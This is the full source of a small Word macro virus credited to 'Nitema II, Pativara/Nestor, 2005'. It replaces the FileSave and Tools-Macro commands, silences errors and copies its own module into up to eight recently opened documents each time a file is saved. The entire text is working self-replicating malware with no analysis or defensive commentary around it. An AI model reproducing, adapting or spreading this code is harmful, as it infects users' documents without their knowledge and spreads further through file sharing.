Attribute VB_Name = "N"
Sub ToolsMacro()
On Error Resume Next
For s = 2 To 9
Application.OrganizerCopy ActiveDocument.FullName, _
RecentFiles(s).Path & "\" & RecentFiles(s).Name, "N", 3
Next s
End Sub
Sub FileSave()
ToolsMacro
End Sub
'Nitema II, Pativara/Nestor, 2005'

